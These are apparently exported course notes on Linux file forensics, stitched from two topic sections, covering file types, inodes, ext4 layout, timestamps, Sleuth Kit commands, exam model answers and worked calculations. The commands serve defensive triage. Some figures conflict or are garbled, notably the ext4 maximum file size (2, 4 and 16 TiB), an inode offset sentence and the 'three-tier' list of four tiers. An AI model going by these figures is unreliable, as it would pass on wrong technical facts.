    t1 --> f1[Named Pipe FIFO]
    t2 --> f2[Character Device]
    t3 --> f3[Directory]
    t4 --> f4[Block Device]
    t5 --> f5[Regular File]
    t6 --> f6[Symbolic Link]
    t7 --> f7[Unix Domain Socket]
    f5 --> sub1[ELF Executable]
    f5 --> sub2[Text Document]
    f5 --> sub3[Image Media]
    f5 --> sub4[Archive]
    f2 --> dev1[dev tty]
    f2 --> dev2[dev null]
    f2 --> dev3[dev mem]
    f2 --> dev4[dev kmem]
    f4 --> dev5[dev sda]
    f4 --> dev6[dev nvme0n1]
    f4 --> dev7[dev loop0]
```

---

## 4.2 Mermaid Diagram: Forensic Identification Workflow

```mermaid
flowchart TD
    startA[Suspicious File Detected] --> cmd1[Step 1: Run ls -l]
    cmd1 --> check1{First char?}
    check1 --> dchar[Type d Directory]
    check1 --> dash1[Type dash Regular]
    check1 --> lchar[Type l Symlink]
    check1 --> cchar[Type c Char Device]
    check1 --> bchar[Type b Block Device]
    check1 --> pchar[Type p Pipe]
    check1 --> schar[Type s Socket]
    dash1 --> cmd2[Step 2: Run file command]
    cmd2 --> cmd3[Step 3: Read Magic Bytes with xxd head]
    cmd3 --> cmd4[Step 4: Run stat for full metadata]
    cmd4 --> cmd5[Step 5: Compute SHA256 hash]
    cmd5 --> decision{Magic matches Extension?}
    decision --> yes1[YES - File is consistent]
    decision --> no1[NO - SUSPICIOUS FLAG]
    no1 --> action1[Quarantine and analyze with strings binwalk]
    no1 --> action2[Check VirusTotal hash lookup]
    no1 --> action3[Sandbox execution in isolated VM]
    yes1 --> action4[Proceed with normal triage]
    cmd1 --> ts1[Step 6: Timestamp Triangulation]
    ts1 --> atime[atime last access]
    ts1 --> mtime[mtime last content change]
    ts1 --> ctime[ctime last metadata change]
    ts1 --> ts2{Correlation with system logs?}
    ts2 --> anom1[YES - Mismatch anomaly]
    ts2 --> norm1[NO - Timeline consistent]
```

---

## 4.3 Block-Level Architecture: Linux VFS File Type Resolution

```mermaid
graph LR
    userA[User Space: ls command] --> syscall1[syscall lstat]
    syscall1 --> vfs1[VFS Layer]
    vfs1 --> inode2[Inode Structure i_mode]
    inode2 --> mask1[AND with S_IFMT 0xF000]
    mask1 --> typeExtract[Extract File Type]
    typeExtract --> lookup1[Compare with constants]
    lookup1 --> charMap[Map to ls -l character]
    charMap --> output1[Render to terminal]
    userB[User Space: file command] --> sysopen[open and read]
    sysopen --> magic1[Read magic.mgc database]
    magic1 --> match1[Match against file signature]
    match1 --> lang1[Language heuristic]
    lang1 --> output2[Output human readable type]
    userC[User Space: stat command] --> statSys[stat syscall]
    statSys --> readIno[Read all inode fields]
    readIno --> fmtOut[Format and output]
```

---

## 4.4 Comparative Matrix Diagram: Linux File Types at a Glance

```mermaid
graph TD
    A[Linux File System Entities] --> B[Regular File]
    A --> C[Directory]
    A --> D[Symbolic Link]
    A --> E[Block Device]
    A --> F[Character Device]
    A --> G[Named Pipe FIFO]
    A --> H[Socket]
    B --> B1[Programs ELF scripts]
    B --> B2[Documents text]
    B --> B3[Media images video]
    B --> B4[Archives tar zip]
    C --> C1[Holds filenames and inodes]
    C --> C2[Contains dot and dotdot]
    C --> C3[Mount points storage]
    D --> D1[Contains path string]
    D --> D2[Can be dangling]
    D --> D3[Cross filesystem boundary]
    E --> E1[Random access block IO]
    E --> E2[Disks and storage]
    E --> E3[Major and minor numbers]
    F --> F1[Sequential byte IO]
    F --> F2[Terminals and pseudo devices]
    F --> F3[Kernel memory in dev mem]
    G --> G1[Unidirectional IPC]
    G --> G2[Kernel buffer 64KiB]
    G --> G3[Created via mkfifo]
    H --> H1[Bidirectional local IPC]
    H --> H2[Unix domain socket]
    H --> H3[Network sockets via AF INET]
```

# SECTION 5: KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A Questions (2 × 3 Marks = 6 Marks)

### Question 1 (3 Marks) `[KTU University Exam - Dec 2023]`

**Q: List any THREE Linux file types and explain how each is represented in the `ls -l` output. Why is understanding file types important in Linux forensics?**

**Model Answer (3 Marks):**

1. **Regular File (`-`)** — Most common type; contains arbitrary data (programs, documents). Represented by `-` in the first character of `ls -l`. Forensic importance: most evidence and hidden malware resides in regular files.

2. **Directory (`d`)** — A special file that maps filenames to inodes. Represented by `d`. Forensic importance: a directory with an unexpected timestamp or hidden entries (e.g., dot-prefixed names) may indicate covert storage.

3. **Symbolic Link (`l`)** — A pointer file containing a pathname. Represented by `l`. Forensic importance: dangling symlinks (broken targets) are a common red flag for tampered system binaries.

> **Why it matters (1 Mark):** In Linux forensics, an investigator must verify that the **inode file type** matches the **claimed content type (via magic bytes)**. Discrepancies indicate **anti-forensic deception** by attackers.

---

### Question 2 (3 Marks) `[KTU University Exam - May 2024]`

**Q: What are "magic numbers" in the context of Linux file identification? Give two examples of magic numbers and the file formats they represent.**

**Model Answer (3 Marks):**

**Definition (1 Mark):** Magic numbers are **fixed, unique byte sequences** located at the beginning (or specific offset) of a file that serve as a **binary signature** identifying the file's true format, regardless of its filename extension. The `file` command and forensic tools like `TrID` and `binwalk` use magic numbers via signature databases (`magic.mgc`) to perform content-based identification.

**Examples (2 Marks — 1 Mark each):**

1. `7F 45 4C 46` (hex) → ASCII `.ELF` → **Executable and Linkable Format (ELF)**, the standard Linux binary format.

2. `89 50 4E 47` (hex) → ASCII `.PNG` → **Portable Network Graphics (PNG)** image format.

*(Other valid examples: `FF D8 FF` for JPEG, `50 4B 03 04` for ZIP, `4D 5A` for Windows PE, `25 50 44 46` for PDF.)*

---

## 5.2 Part B Questions (14 Marks — Module Internal Choice)

### Question A — Choice 1 (14 Marks) `[KTU University Exam - Dec 2023]`

**Q: (a)** Explain the seven standard Linux file types with their `ls -l` symbols and provide one real-world example for each. Discuss the role of the **inode** in storing file-type information. **(7 Marks)**

**Q: (b)** Describe the working of the `file` command in Linux. Explain the **three-tier test logic** it employs, the role of the magic database (`magic.mgc`), and how it assists in forensic investigations. Discuss the limitation of the `file` command against header-manipulation attacks. **(7 Marks)**

---

#### Model Solution for Q.A(a) (7 Marks)

**1. Seven Linux File Types (4 Marks — ~0.5 Mark each):**

| Symbol | File Type | Example | Description |
|:------:|:----------|:--------|:------------|
| `-` | Regular File | `/etc/passwd` | Ordinary data; programs, documents |
| `d` | Directory | `/home` | Maps names to inodes |
| `l` | Symbolic Link | `/bin/sh -> dash` | Pathname pointer |
| `b` | Block Device | `/dev/sda` | Buffered block I/O |
| `c` | Character Device | `/dev/null` | Unbuffered char I/O |
| `p` | Named Pipe | `/tmp/myfifo` | FIFO for IPC |
| `s` | Socket | `/var/run/docker.sock` | Unix domain socket |

**2. The Inode and File-Type Encoding (3 Marks):**

- The **inode** is a data structure stored in the inode table that holds all metadata about a file except its name and data blocks.
- The 16-bit `i_mode` field encodes the file type in its **upper 4 bits** (`S_IFMT` mask `0xF000`).
- The kernel uses `i_mode & 0xF000` to extract the type code (`0x8000` for regular, `0x4000` for directory, etc.).
- Tools like `stat` retrieve and display this raw mode value, e.g., `-rw-r--r--` corresponds to mode `100644₈` where `100000₈` indicates a regular file.

> **Examiner's Note (1 Mark):** Award full credit if the student mentions that **file extensions are ignored by the kernel** — only the inode type governs how the kernel handles the file.

---

#### Model Solution for Q.A(b) (7 Marks)

**1. Purpose of the `file` Command (1 Mark):**
The `file` command performs **content-based file identification** by analyzing actual byte patterns, not relying on filename extensions.

**2. Three-Tier Test Logic (3 Marks):**

- **Tier 1 — Filesystem Test:** Calls `stat()` and checks the inode type. If the file is a directory, symlink, FIFO, socket, or device, returns immediately with a label like `directory`, `symbolic link`, `socket`.
- **Tier 2 — Magic Number Test:** Reads the first 256 bytes (default) and matches against the **`/usr/share/file/magic.mgc`** compiled database. Returns format-specific descriptions like `ELF 64-bit LSB executable, dynamically linked, ...`.
- **Tier 3 — Language Test:** Applies heuristics to detect plain text, shell scripts (`#!/...`), C source, HTML, etc.
- **Tier 4 — Fallback:** Returns generic `data` if no test matches.

**3. Role of `magic.mgc` (1 Mark):**
The Magic database contains **thousands of binary signatures** (magic numbers) and rules. It is compiled from `/usr/share/file/magic` source for performance. The `file -C` command recompiles the database.

**4. Forensic Utility (1 Mark):**
- Detects **file-type spoofing** (e.g., `malware.jpg` that is actually ELF).
- Identifies **unknown or zero-day binaries** by format.
- Provides **content-aware triage** during incident response.

**5. Limitation — Header Manipulation (1 Mark):**
Attackers can prepend junk bytes (e.g., 4 KiB of nulls) to defeat the default read window. **Counter:** Use `file -m /path/to/custom.magic` with a deeper offset, or use **forensic tools** like `TrID`, `binwalk`, or `foremost` that perform entropy analysis and recursive scanning.

---

### Question B — Choice 2 (14 Marks) `[KTU University Exam - May 2024]`

**Q: (a)** With a neat explanation, discuss the **inode data structure** in Linux. List the key inode fields relevant to digital forensics and explain how the file type is encoded in the `st_mode` field. **(7 Marks)**

**Q: (b)** Explain the `stat` and `find -type` commands with examples. How would an investigator use them to locate all **setuid root binaries** and **suspicious socket files** during a forensic investigation? Provide a step-by-step methodology. **(7 Marks)**

---

#### Model Solution for Q.B(a) (7 Marks)

**1. Inode Definition (2 Marks):**
An **inode (Index Node)** is the **fundamental metadata structure** in UNIX/Linux filesystems. Every file and directory has exactly one inode (identified by an inode number, `i_ino`). The inode is stored in the inode table and contains **all information about a file except its name and data blocks**.

**2. Key Forensic Fields (3 Marks — 0.5 each):**

| Field | Description | Forensic Use |
|:------|:------------|:-------------|
| `i_mode` | Type + permissions | Detect SUID, world-writable files |
| `i_uid`, `i_gid` | Owner IDs | Detect unauthorized ownership changes |
| `i_size` | File size | Anomaly detection |
| `i_atime` | Access time | User activity timeline |
| `i_mtime` | Modification time | Content change timeline |
| `i_ctime` | Inode change time | Permission/owner tampering detection |
| `i_links_count` | Hard link count | Detect link attacks |
| `i_blocks` | Disk blocks allocated | Detect sparse file anomalies |

**3. File-Type Encoding in `st_mode` (2 Marks):**

- `st_mode` is a 16-bit field: upper 4 bits for type, lower 12 bits for permissions.
- The kernel applies the mask `S_IFMT = 0170000₈ = 0xF000` to extract the type.
- The result is compared against `S_IFREG (0100000)`, `S_IFDIR (0040000)`, `S_IFLNK (0120000)`, `S_IFBLK (0060000)`, `S_IFCHR (0020000)`, `S_IFIFO (0010000)`, `S_IFSOCK (0140000)`.
- Example: `i_mode = 0x81A4` → `0x8000` (regular file) + `0x01A4` (mode `0644` = `rw-r--r--`).

---

#### Model Solution for Q.B(b) (7 Marks)

**1. The `stat` Command (2 Marks):**

The `stat` command displays **complete inode metadata** for a file or filesystem. Example:

```bash
$ stat /bin/bash
  File: /bin/bash
  Size: 1234567        Blocks: 2412       IO Block: 4096   regular file
Device: 803h/2051d      Inode: 131073      Links: 1
Access: (0755/-rwxr-xr-x)  Uid: ( 0/   root)   Gid: ( 0/   root)
Access: 2024-01-15 10:30:00.000000000 +0530
Modify: 2024-01-10 08:15:00.000000000 +0530
Change: 2024-01-10 08:15:00.000000000 +0530
```

Investigators use `stat` to verify timestamps, ownership, and permissions — all critical evidence.

**2. The `find -type` Command (2 Marks):**

The `find` command with `-type` searches for files matching a specific inode type. Syntax: `find <path> -type <type-char>`. Examples:

```bash
find / -type d -name ".*"          # Find hidden directories
find / -type l -xtype l            # Find dangling symlinks
find / -type s                     # Find all socket files
find / -type p                     # Find all named pipes
```

**3. Methodology — Locating SUID Root Binaries (1.5 Marks):**

```bash
find / -perm -4000 -type f -user root -ls 2>/dev/null
```

This searches for files with the **setuid bit** (mode `4000`) owned by root. Such binaries, if trojaned, allow **privilege escalation**. Compare the output against a known-good baseline (e.g., from `rpm --verify` or `dpkg --verify`).

**4. Methodology — Locating Suspicious Sockets (1.5 Marks):**

```bash
find / -type s -ls 2>/dev/null
```

Manually inspect each socket: legitimate sockets are in `/var/run/`, `/run/`, `/tmp/.X11-unix/`. Sockets in unusual paths (e.g., `/home/user/.cache/.x`) or owned by non-service users warrant investigation. Cross-reference with `ss -x -p` or `lsof -U` to see which process owns the socket.

---

> [!WARNING]
> **KTU Examiner's Valuation Warning — Common Pitfalls:**
>
> 1. **Confusing `file` extensions with file types** — Students often write "the file type is `.txt`" which is **wrong**. Extensions are user-space labels; the kernel uses inode type.
> 2. **Forgetting the `s` (socket) type** — Most answer scripts mention only 5–6 types and skip sockets. Always enumerate **all seven**.
> 3. **Confusing `atime` with `mtime`** — Access time is when data was **read**; modification time is when data was **written**. Ctime is **not** "create time" — it is the **inode change time**.
> 4. **Not mentioning magic numbers** — For 7-mark questions on the `file` command, failing to mention **magic numbers** and the **magic.mgc database** typically loses 2–3 marks.
> 5. **Ignoring forensic relevance** — A purely technical answer without "why this matters in an investigation" loses the application marks.

---

## 5.3 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **Rapid Revision Checklist — Linux File Types & Identification**

- 🔑 **Linux has 7 standard file types:** Regular (`-`), Directory (`d`), Symbolic Link (`l`), Block Device (`b`), Character Device (`c`), Named Pipe (`p`), Socket (`s`).
- 🔑 **File type is determined by the inode, NOT the extension.** The 16-bit `i_mode` field encodes the type in its upper 4 bits (mask `0xF000`).
- 🔑 **Block devices** provide **buffered, random-access** I/O (e.g., `/dev/sda`). **Character devices** provide **unbuffered, sequential** I/O (e.g., `/dev/tty`).
- 🔑 **Symbolic links** contain a pathname; they can be **dangling** (broken) — a forensic red flag.
- 🔑 **Named pipes (FIFOs)** are half-duplex IPC channels with data held in **kernel memory** (default 64 KiB buffer), not on disk.
- 🔑 **Unix domain sockets** appear in the filesystem for IPC; suspicious socket locations indicate potential C2 channels.
- 🔑 The **`file` command** uses **three-tier testing**: filesystem test → magic number test → language test → fallback `data`.
- 🔑 **Magic numbers** are unique byte signatures in file headers (e.g., `7F 45 4C 46` for ELF, `89 50 4E 47` for PNG).
- 🔑 The magic database is **`/usr/share/file/magic.mgc`**; recompile with `file -C`.
- 🔑 The **`stat` command** displays **all inode fields** including `atime`, `mtime`, `ctime` — the forensic timeline triangle.
- 🔑 **Anti-forensics awareness:** `noatime` mount option, `touch`, and `libfaketime` can manipulate timestamps. Header padding can defeat `file`. Always corroborate with **filesystem journals** and **content hashes** (SHA-256).
- 🔑 **Forensic commands to memorize:** `ls -l`, `file`, `stat`, `find -type`, `find -perm -4000`, `lsof -U`, `ss -x -p`.
- 🔑 **Forensic golden rule:** A **mismatch between file extension and magic bytes** is a **critical investigation trigger**.

---
<!-- SECTION_5_END -->

topics.title: Linux File Analysis
topics.content:
<!-- SECTION_1_START -->
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECCT866 - WINDOWS AND LINUX FORENSICS
> - **Module:** Module 4
> - **Topic:** Linux File Analysis

# 1. Core Technical Definition & Intuitive Overview

## 1.1 Formal Definition (KTU 2024 Syllabus Terminology)

> [!NOTE]
> **Linux File Analysis** is the systematic forensic examination of the Linux file system architecture—including superblocks, inode tables, directory entries, data blocks, journal logs, and metadata—to recover, reconstruct, and authenticate digital evidence related to file creation, modification, access, deletion, and ownership.

In the KTU 2024 Scheme framework, Linux File Analysis under **PECCT866** encompasses the techniques required to investigate artifacts stored in native Linux file systems (commonly **ext2**, **ext3**, **ext4**, **XFS**, **Btrfs**, and **ReiserFS**), trace user activities through shell history and configuration files, and apply tools such as **The Sleuth Kit (TSK)**, **Autopsy**, **Foremost**, **Scalpel**, and **TestDisk/PhotoRec**.

## 1.2 Conceptual Analogy — Plain English Intuition

Imagine a massive library (your hard disk) that contains millions of books (files). Instead of writing the book's location directly on the cover, the librarian maintains a **catalogue card** (the **inode**) for every book. The card holds:
- The book's actual shelf location (data block pointers)
- The book's size, author, and edition (metadata)
- The last time the book was read (access timestamp)

When a book is "borrowed and never returned" (a file is deleted), the catalogue card is **not destroyed immediately**. The librarian simply marks it as "available for reuse" and keeps the card for a short time. A forensic investigator can search these "marked available" cards to recover books that people thought were gone forever. **That is exactly what Linux File Analysis does at the binary level.**

## 1.3 Physical Constants & Standard Metrics

> [!IMPORTANT]
> Key Linux Forensic Constants (Memorize for KTU):
> - **Default block size (ext4):** **4096 bytes (4 KiB)**
> - **Default inode size (ext4):** **256 bytes**
> - **Maximum filename length:** **255 bytes** (UTF-8 encoded)
> - **Maximum file size (ext4 with 4 KiB blocks):** **2 TiB** (with 48-bit block addressing: up to **1 EiB**)
> - **Maximum volume size (ext4):** **1 EiB**
> - **Timestamps per inode:** **4** (atime, mtime, ctime, crtime/dtime)
> - **Reserved UIDs (0–999):** System accounts
> - **Regular users UIDs:** **1000–60000** (default RHEL/Debian convention)

## 1.4 Syllabus Highlights

> [!IMPORTANT]
> **KTU 2024 Scheme — Module 4 Expected Outcomes:**
> After completing this topic, the student should be able to:
> - **CO4:** Analyze Linux file systems for forensic artifacts.
> - Identify critical evidence from `/etc/passwd`, `/etc/shadow`, `/var/log`, and shell history.
> - Recover deleted files using Sleuth Kit commands (`fls`, `icat`, `istat`).
> - Interpret inode metadata and timestamp anomalies for timeline reconstruction.

---

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->

# 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Anatomy of a Linux File System (ext4 focus)

The ext4 file system is logically divided into several structural components, each serving a unique forensic purpose:

### 2.1.1 The Superblock (Block Group 0)
- **Location:** Fixed offset (typically **1024 bytes** from the partition start).
- **Purpose:** Contains global file system metadata.
- **Forensic Value:** Source of truth for block size, inode count, mount count, last check time, last write time, and filesystem state.

### 2.1.2 Group Descriptors
- Describe each **block group** (default 32,768 blocks per group).
- Contain block bitmap, inode bitmap, and inode table locations.

### 2.1.3 Inode (Index Node)
- The **heart of Linux file analysis**.
- A 256-byte (ext4) data structure that stores **all metadata** about a file except its name.
- Each file has exactly **one inode**; the filename lives in the directory entry, which simply *points* to the inode number.

### 2.1.4 Data Blocks
- The actual content storage areas, sized **4 KiB** by default.

### 2.1.5 Journal (ext4/ext3)
- A transactional log that records upcoming metadata changes before commit.
- **Goldmine for forensics** — reveals intent, timing, and operation sequence even when files are deleted.

## 2.2 Inode Structure — Field-by-Field Breakdown

| Field (ext4 inode) | Size | Forensic Significance |
|---|---|---|
| `i_mode` | 16 bits | File type + permissions (`0755`, `0644`) |
| `i_uid` / `i_gid` | 16 bits each | Owner / Group ID |
| `i_size` | 64 bits | Logical file size in bytes |
| `i_atime` | 32 bits (sec) | Last **access** time |
| `i_ctime` | 32 bits (sec) | Last **inode/metadata change** |
| `i_mtime` | 32 bits (sec) | Last **data modification** time |
| `i_crtime` | 32 bits (ext4) | **Creation** / birth time |
| `i_dtime` | 32 bits | **Deletion** time |
| `i_blocks` | 32 bits | File size in 512-byte sectors |
| `i_links_count` | 16 bits | Hard link count |
| `i_block[15]` | 60 bytes | Data block pointers (12 direct + 1 indirect + 1 double-indirect + 1 triple-indirect) |
| `i_flags` | 32 bits | Ext4-specific flags (e.g., immutable, append-only) |
| `i_generation` | 32 bits | NFS file version |

> [!IMPORTANT]
> **Why this matters in KTU exams:** A question may give you a hex dump and ask you to interpret the inode. Know that **`i_atime + 40 bytes = i_ctime + 40 bytes = i_mtime` offsets** in the ext inode structure (varies by version).

## 2.3 The Linux Timestamp Quartet (MACB + Birth)

Linux maintains **4 primary timestamps** per inode (the **MACB** model):

| Letter | Name | Source Field | Triggered By |
|---|---|---|---|
| **M** | Modified time | `i_mtime` | Writing to file content |
| **A** | Access time | `i_atime` | Reading file content |
| **C** | Changed time | `i_ctime` | Metadata change (perm, owner) |
| **B** | Birth/Creation | `i_crtime` | File creation (ext4) |
| **D** | Deletion | `i_dtime` | File deletion (unlink) |

> [!NOTE]
> **DTime anomaly**: In ext4, `i_dtime` is set to the deletion timestamp only when the inode is *freed*. Until then, even unlinked files retain their original `i_dtime = 0`. This is critical for forensic timeline reconstruction.

## 2.4 Mathematical Foundations of Inode Addressing

> [!IMPORTANT]
> **KTU Formula Sheet — Master These Equations:**

| Formula | Description |
|---|---|
| $N_{\text{inode}} = \dfrac{N_{\text{blocks}} \times \text{inode\_ratio}}{\text{block\_size}}$ | Inode count derivation |
| $A_{\text{file}} = \lceil \dfrac{S_{\text{file}}}{\text{block\_size}} \rceil \times \text{block\_size}$ | Disk space allocated (rounded up to block boundary) |
| $S_{\text{slack}} = A_{\text{file}} - S_{\text{file}}$ | **File slack space** (residual bytes in last block) |
| $B_{\text{max}} = 12 + \left(\dfrac{bs}{4}\right) + \left(\dfrac{bs}{4}\right)^2 + \left(\dfrac{bs}{4}\right)^3$ | Maximum blocks addressable by inode (with $bs$ = block size in bytes) |
| $O_{\text{inode}} = \text{inode\_table\_start} + (G \times G_{\text{size}}) + ((I-1) \times 256)$ | Inode byte offset on disk |

**Where:**
- $N_{\text{blocks}}$ = total blocks in filesystem
- $\text{inode\_ratio}$ = bytes-per-inode (default **16384** in `mke2fs`)
- $S_{\text{file}}$ = logical file size in bytes
- $A_{\text{file}}$ = allocated disk space
- $S_{\text{slack}}$ = slack space (often contains **RAM residue** or prior file data)
- $G$ = block group number, $G_{\text{size}}$ = inode table size in bytes
- $I$ = inode number (1-indexed)

## 2.5 Critical Linux Artifacts for Forensic Examination

| Artifact Path | Forensic Information Extracted |
|---|---|
| `/etc/passwd` | All user accounts, UIDs, GIDs, home dirs, default shells |
| `/etc/shadow` | Hashed passwords, last change, min/max days, account expiry |
| `/etc/group` | Group memberships |
| `/etc/sudoers` | Privilege escalation rules |
| `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/*` | Scheduled tasks (persistence mechanism) |
| `/var/log/auth.log` (Debian) or `/var/log/secure` (RHEL) | SSH logins, sudo usage, PAM failures |
| `/var/log/syslog` | General system messages |
| `/var/log/wtmp`, `/var/log/btmp`, `/var/log/utmp` | Login/logout records (`last`, `lastb`, `who`) |
| `/var/log/messages` | Kernel and boot messages |
| `/var/log/apache2/*`, `/var/log/nginx/*` | Web server access/error logs |
| `/var/log/audit/audit.log` | SELinux/AppArmor audit trail |
| `~/.bash_history`, `~/.zsh_history` | Command-line activity (per user) |
| `~/.ssh/authorized_keys`, `~/.ssh/known_hosts` | SSH trust relationships |
| `/etc/hosts`, `/etc/resolv.conf` | Network configuration |
| `/proc/[pid]/` | Live process memory maps (volatile — goldmine on running systems) |

## 2.6 Sleuth Kit (TSK) Command Reference

| Tool | Function | Example |
|---|---|---|
| `mmls` | List partition layout | `mmls disk.img` |
| `fsstat` | Display file system stats | `fsstat -o 2048 disk.img` |
| `fls` | List filenames (including deleted) | `fls -r -d / disk.img` |
| `icat` | Extract inode contents | `icat disk.img 1234 > file.txt` |
| `istat` | Display inode metadata | `istat disk.img 1234` |
| `ifind` | Find inode from filename | `ifind disk.img -n "passwd"` |
| `ffind` | Find filename from inode | `ffind disk.img 1234` |
| `blkls` | Extract unallocated blocks | `blkls disk.img > unalloc.bin` |
| `blkcat` | Extract specific block | `blkcat disk.img 5000` |
| `ils` | List all inodes (deleted included) | `ils disk.img` |
| `mac-robber` | Copy mounted filesystem data | `mac-robber /mnt/evidence > body.txt` |
| `mactime` | Build timeline from MAC times | `mactime -b body.txt > timeline.csv` |

## 2.7 Real-World Engineering Utility

Linux file analysis underpins:
- **Incident Response** — detecting rootkits via inode/permission anomalies.
- **Data Breach Investigation** — recovering exfiltrated files from unallocated space.
- **Insider Threat Detection** — correlating `bash_history` with file modifications.
- **Litigation Support** — preserving evidence per chain-of-custody standards.
- **Malware Analysis** — extracting packed binaries from `/tmp` or `$HOME`.

---

<!-- SECTION_3_START -->

# 3. Step-by-Step Derivations & Analytical Matrix

## 3.1 Derivation: Maximum File Size for ext4 with 4 KiB Blocks

**Problem (Typical KTU Numerical):** Derive the maximum file size addressable by a single ext4 inode with a 4 KiB block size using 32-bit block pointers.

**Given:**
- Block size $bs = 4096$ bytes = $2^{12}$ bytes
- Pointer size = 32 bits = 4 bytes
- Inode pointer array = 60 bytes → 15 pointers
- Structure: 12 direct + 1 single-indirect + 1 double-indirect + 1 triple-indirect

**Step 1 — Compute pointers per block:**
A block is entirely filled with 4-byte pointers, so:
$$
P = \frac{bs}{4} = \frac{4096}{4} = 1024 \text{ pointers/block}
$$

**Step 2 — Count addressable blocks per pointer type:**

| Level | Pointer Count | Blocks Addressable |
|---|---|---|
| Direct | 12 | $12 \times 1 = 12$ |
| Single-indirect | 1 | $1 \times 1024 = 1024$ |
| Double-indirect | 1 | $1 \times 1024^2 = 1{,}048{,}576$ |
| Triple-indirect | 1 | $1 \times 1024^3 = 1{,}073{,}741{,}824$ |

**Step 3 — Sum total addressable blocks:**
$$
B_{\max} = 12 + 1024 + 1024^{2} + 1024^{3}
$$

$$
\begin{aligned}
B_{\max} &= 12 + 1{,}024 + 1{,}048{,}576 + 1{,}073{,}741{,}824 \\
&= 1{,}074{,}791{,}436 \text{ blocks}
\end{aligned}
$$

**Step 4 — Convert to bytes:**
$$
S_{\max} = B_{\max} \times bs = 1{,}074{,}791{,}436 \times 4096
$$

$$
\begin{aligned}
S_{\max} &= 4{,}402{,}345{,}472{,}256 \text{ bytes} \\
&\approx 4.00 \text{ TiB}
\end{aligned}
$$

> [!NOTE]
> With ext4's **48-bit block addressing** (`inode->i_block` extended via `i_blocks_hi`), this expands to a theoretical **16 TiB** per file. With 4 KiB blocks and 48-bit addressing, the real maximum reaches **2 TiB** (limited by `i_size` lower 32 bits in legacy extents).

## 3.2 Worked Example: Computing Slack Space

**Problem:** A forensic examiner recovers a 7,325-byte JPEG image from a Linux ext4 partition with default 4 KiB block size.

**Step 1 — Compute allocated blocks:**
$$
A_{\text{file}} = \left\lceil \frac{7325}{4096} \right\rceil \times 4096
$$

**Step 2 — Evaluate ceiling:**
$$
\frac{7325}{4096} = 1.7883\ldots
$$
$$
\lceil 1.7883 \rceil = 2 \text{ blocks}
$$

**Step 3 — Compute allocated bytes:**
$$
A_{\text{file}} = 2 \times 4096 = 8192 \text{ bytes}
$$

**Step 4 — Compute slack:**
$$
S_{\text{slack}} = 8192 - 7325 = 867 \text{ bytes}
$$

> [!IMPORTANT]
> **Forensic Implication:** Those 867 bytes may contain **RAM residues, fragments of previously deleted files, or attacker-injected code**. Investigators must always analyze slack space using `blkls`, `foremost`, or `scalpel` with a custom signature file.

## 3.3 Worked Example: Reconstructing an Inode Address

**Problem:** An investigator locates `inode #48732` on an ext4 partition. Block group size is 8192 blocks. The inode table for its block group starts at byte offset **2,146,304** from the start of the partition. Compute the byte offset of the inode on disk.

**Given:**
- Inode number $I = 48732$
- Inode size = **256 bytes** (ext4 default)
- Block group size $G_{\text{size\_inodes}} = 8192$ inodes per group
- Group number can be derived: $G = \lceil 48732 / 8192 \rceil = \lceil 5.949 \rceil = 6$

**Step 1 — Compute relative index within group:**
$$
I_{\text{rel}} = ((I - 1) \bmod G_{\text{size\_inodes}}) + 1
$$

$$
\begin{aligned}
I_{\text{rel}} &= ((48732 - 1) \bmod 8192) + 1 \\
&= (48731 \bmod 8192) + 1
\end{aligned}
$$

**Step 2 — Compute modulo:**
$$
48731 \div 8192 = 5 \text{ remainder } 7711
$$
$$
I_{\text{rel}} = 7711 + 1 = 7712
$$

**Step 3 — Compute byte offset:**
$$
O_{\text{inode}} = \text{inode\_table\_start} + ((I_{\text{rel}} - 1) \times 256)
$$

$$
\begin{aligned}
O_{\text{inode}} &= 2{,}146{,}304 + ((7712 - 1) \times 256) \\
&= 2{,}146{,}304 + (7711 \times 256) \\
&= 2{,}146{,}304 + 1{,}974{,}016 \\
&= 4{,}120{,}320 \text{ bytes from partition start}
\end{aligned}
$$

**Step 4 — Verify by reading 256 bytes:**
Use `istat disk.img 48732` to confirm metadata fields align with file properties in the case.

## 3.4 Analytical Matrix: KTU-Mapped Concept Difficulty vs. Marks

| Concept | KTU Bloom Level | Expected Marks (Part A) | Expected Marks (Part B) |
|---|---|---|---|
| Define inode & superblock | Remember | 3 | — |
| List critical Linux log files | Remember | 3 | — |
| Explain MACB timestamps | Understand | 3 | — |
| Compare ext3 vs ext4 journaling | Analyze | — | 7 |
| Recover deleted file with Sleuth Kit | Apply | — | 7 |
| Derive maximum file size | Apply | — | 7 |
| Build forensic timeline from `mactime` | Analyze | — | 14 (combined) |
| Interpret inode metadata dump | Evaluate | — | 14 (combined) |

# 4. Structural Diagrams & Schematics

## 4.1 ext4 File System Layout (Top-Down View)

```mermaid
graph TD
    A[Partition Start - Byte 0] --> B[Boot Block - 1024 bytes]
    B --> C[Superblock - 1024 bytes]
    C --> D[Group Descriptors]
    D --> E[Reserved GDT Blocks]
    E --> F[Block Bitmap]
    F --> G[Inode Bitmap]
    G --> H[Inode Table - 256 bytes per inode]
    H --> I[Data Blocks - 4096 bytes each]
    I --> J[Journal - ext4 transactional log]
    
    subgraph BG1 [Block Group 0]
    C
    D
    E
    F
    G
    H
    I
    end
    
    subgraph BG2 [Block Group 1 to N]
    K[Block Bitmap] --> L[Inode Bitmap]
    L --> M[Inode Table]
    M --> N[Data Blocks]
    end
```

## 4.2 Inode Internal Structure (ext4)

```mermaid
graph TD
    I[Inode - 256 bytes] --> A[i_mode - 2 bytes]
    I --> B[i_uid - 2 bytes]
    I --> C[i_size - 8 bytes]
    I --> D[i_atime - 4 bytes]
    I --> E[i_ctime - 4 bytes]
    I --> F[i_mtime - 4 bytes]
    I --> G[i_dtime - 4 bytes]
    I --> H[i_gid - 2 bytes]
    I --> J[i_links_count - 2 bytes]
    I --> K[i_blocks - 4 bytes]
    I --> L[i_flags - 4 bytes]
    I --> M[i_osd1 - 4 bytes]
    I --> N[i_block - 60 bytes - 15 pointers]
    I --> O[i_generation - 4 bytes]
    I --> P[i_file_acl - 4 bytes]
    I --> Q[i_crtime - 4 bytes]
    I --> R[i_extra_isize - 2 bytes]
    I --> S[i_checksum_hi - 2 bytes]
    
    N --> N1[Pointer 0-11: Direct Blocks]
    N --> N2[Pointer 12: Single Indirect]
